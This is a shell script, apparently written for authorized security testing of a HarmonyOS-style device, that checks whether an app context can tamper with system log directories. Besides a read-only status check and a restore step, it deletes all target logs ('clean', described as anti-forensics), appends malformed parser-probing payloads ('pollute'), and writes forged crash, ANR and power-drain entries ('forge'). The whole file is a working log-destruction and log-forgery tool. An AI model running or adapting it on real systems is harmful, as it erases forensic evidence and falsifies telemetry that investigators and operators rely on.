#!/system/bin/sh
# log_tamper.sh  [T8 / A 层残存能力验证：日志清理/污染]
# 用途：在持有对应权限的应用上下文内，验证并演示 data_log 标签路径的
#       完整性攻击能力（反取证清理 / 遥测污染 / 伪造注入）。
# 判定依据（results_pc_20260815 第 6 轮）：
#   - normal_hap 对 data_log 有 dir search + remove_name/write
#     + file open/read/write/unlink（规则拼合，SELinux 链完整）
#   - 挂载闸 = 权限授予制（ACCESS_BBOX_DIR / ACCESS_HIVIEWX / READ_DFX_XPOWER）
#   - 边界：faultlogger（双关不可碰）、hilog（无有效授权）、内核日志（不可见）
# 模式：
#   status  只读侦察：目标目录、文件数、可写性探测（不改任何东西）
#   clean   反取证：备份后清空目标目录全部日志（.lt_bak/）
#   pollute 遥测污染：向每个日志文件追加畸形负载（解析器探针）
#   forge   伪造注入：生成仿格式假日志条目（时间戳可指定）
#   restore 从 .lt_bak/ 恢复
# 安全设计：写操作前自动备份；restore 可完整回滚；全程输出操作清单。
# 授权：仅用于已授权设备的安全测试。默认目标可用 LOG_DIRS 环境变量覆盖
#       （本地联调用）。

LOG_DIRS=${LOG_DIRS:-"/data/log/bbox /data/log/UserView /data/log/xpower"}
BAK_SUFFIX=".lt_bak"
MARK="[LT]"
TS=${LT_TS:-"20260815000000000"}   # forge 用假时间戳，可用 LT_TS 覆盖

log() { echo "$MARK $*"; }

die() { log "错误: $*"; exit 1; }

usage() {
    echo "用法: sh log_tamper.sh <status|clean|pollute|forge|restore>"
    exit 1
}

[ $# -eq 1 ] || usage
MODE=$1

log "身份: $(id 2>&1)"
log "标签: $(ls -Zd /proc/self 2>&1 | head -1)"
log "模式: $MODE ; 目标: $LOG_DIRS"

# ---------- status：只读侦察 ----------
do_status() {
    for d in $LOG_DIRS; do
        if [ -d "$d" ]; then
            n=$(ls "$d" 2>/dev/null | wc -l | tr -d ' ')
            sz=$(du -sk "$d" 2>/dev/null | cut -f1)
            log "目录 $d : 存在, ${n} 项, ${sz}KB"
            ls -l "$d" 2>/dev/null | head -5 | while read -r l; do log "  $l"; done
            # 可写性探测（无破坏）：touch 自有探测文件
            if touch "$d/.lt_probe" 2>/dev/null; then
                log "  写权限: 可（挂载+SELinux+DAC 三闸过）"
                rm -f "$d/.lt_probe"
            else
                log "  写权限: 否（$?）——该目标对本应用关闭"
            fi
        else
            log "目录 $d : 不存在（未挂载=未持有对应权限，或路径错误）"
        fi
    done
}

# ---------- 备份 / 恢复 ----------
backup_dir() {
    d=$1
    [ -d "$d" ] || return 1
    cnt=$(ls "$d" 2>/dev/null | grep -v "$BAK_SUFFIX" | wc -l | tr -d ' ')
    [ "$cnt" = "0" ] && { log "跳过 $d（空）"; return 0; }
    if mkdir -p "$d$BAK_SUFFIX" 2>/dev/null; then
        for f in "$d"/*; do
            [ -f "$f" ] || continue
            case "$f" in *"$BAK_SUFFIX") continue ;; esac
            cp "$f" "$d$BAK_SUFFIX/" 2>/dev/null && log "备份 $f"
        done
    else
        log "警告: $d 无法建备份目录，继续执行（无回滚）"
    fi
}

do_clean() {
    for d in $LOG_DIRS; do
        [ -d "$d" ] || { log "跳过 $d（不存在）"; continue; }
        backup_dir "$d"
        n=0
        for f in "$d"/*; do
            [ -f "$f" ] || continue
            case "$f" in *"$BAK_SUFFIX") continue ;; esac
            if rm -f "$f" 2>/dev/null; then
                n=$((n + 1)); log "删除 $f"
            else
                log "删除失败 $f (rc=$?)"
            fi
        done
        log "清理完成 $d : 删除 ${n} 个文件"
    done
}

do_pollute() {
    for d in $LOG_DIRS; do
        [ -d "$d" ] || { log "跳过 $d（不存在）"; continue; }
        backup_dir "$d"
        for f in "$d"/*; do
            [ -f "$f" ] || continue
            case "$f" in *"$BAK_SUFFIX") continue ;; esac
            # 畸形负载：超长行 + 二进制字节 + 假时间戳，喂解析器
            { echo "$TS POLLUTE_MARKER_A $(head -c 200 /dev/zero | tr '\0' 'A')"
              printf '%b' '\x00\x01\x02\xff\xfe'
              echo "$TS POLLUTE_MARKER_B {\"fake\":\"json\",\"depth\":(((((((((("
            } >> "$f" 2>/dev/null && log "污染 $f" || log "污染失败 $f (rc=$?)"
        done
    done
}

do_forge() {
    for d in $LOG_DIRS; do
        [ -d "$d" ] || { log "跳过 $d（不存在）"; continue; }
        backup_dir "$d"
        f="$d/lt_forged_$$.log"
        {
            echo "$TS FORGE_EVENT type=fake_crash pid=1 uid=0 comm=system_server"
            echo "$TS FORGE_EVENT type=fake_anr bundle=com.example.target"
            echo "$TS FORGE_EVENT type=fake_power drain=9999 app=com.example.target"
        } > "$f" 2>/dev/null && log "伪造 $f（3 条假事件）" || log "伪造失败 (rc=$?)"
    done
}

do_restore() {
    for d in $LOG_DIRS; do
        b="$d$BAK_SUFFIX"
        [ -d "$b" ] || { log "无备份 $d"; continue; }
        cp "$b"/* "$d/" 2>/dev/null
        n=$(ls "$b" 2>/dev/null | wc -l | tr -d ' ')
        log "恢复 $d : ${n} 个文件"
    done
}

case "$MODE" in
    status)  do_status ;;
    clean)   do_clean ;;
    pollute) do_pollute ;;
    forge)   do_forge ;;
    restore) do_restore ;;
    *)       usage ;;
esac
log "完成"
